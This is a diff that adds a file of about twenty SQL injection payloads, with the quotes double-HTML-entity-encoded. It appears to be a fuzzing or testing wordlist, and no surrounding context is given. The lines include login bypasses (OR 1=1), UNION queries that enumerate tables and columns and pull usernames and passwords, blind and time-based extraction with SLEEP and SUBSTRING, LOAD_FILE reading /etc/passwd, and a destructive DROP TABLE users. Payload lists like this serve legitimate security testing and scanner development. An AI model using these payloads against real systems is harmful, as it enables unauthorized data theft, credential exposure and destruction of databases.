@@ -1,0 +1,20 @@
+&#x26;#x27; OR 1=1--
+&#x26;#x27; OR &#x26;#x27;1&#x26;#x27;=&#x26;#x27;1
+&#x26;#x27; UNION SELECT null, null--
+&#x26;#x27; UNION SELECT 1, @@version--
+&#x26;#x27; UNION SELECT 1, table_name FROM information_schema.tables--
+&#x26;#x27; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#x26;#x27;users&#x26;#x27;--
+&#x26;#x27; UNION SELECT username, password FROM users--
+&#x26;#x27; AND SLEEP(5)--
+&#x26;#x27;; DROP TABLE users--
+&#x26;#x27; OR 1=1 LIMIT 1--
+&#x26;#x27; ORDER BY 1--
+&#x26;#x27; ORDER BY 3--
+&#x26;#x27; AND (SELECT COUNT(*) FROM users) &#x26;gt; 0--
+&#x26;#x27; AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) &#x26;gt; 65--
+&#x26;#x27; UNION SELECT 1, LOAD_FILE(&#x26;#x27;/etc/passwd&#x26;#x27;)--
+&#x26;#x27; UNION SELECT 1, user()--
+&#x26;#x27; UNION SELECT 1, database()--
+&#x26;#x27; AND 1=IF(1=1, SLEEP(3), 0)--
+&#x26;#x27; OR EXISTS(SELECT * FROM users WHERE username=&#x26;#x27;admin&#x26;#x27;)--
+&#x26;#x27; UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()&#x2014;
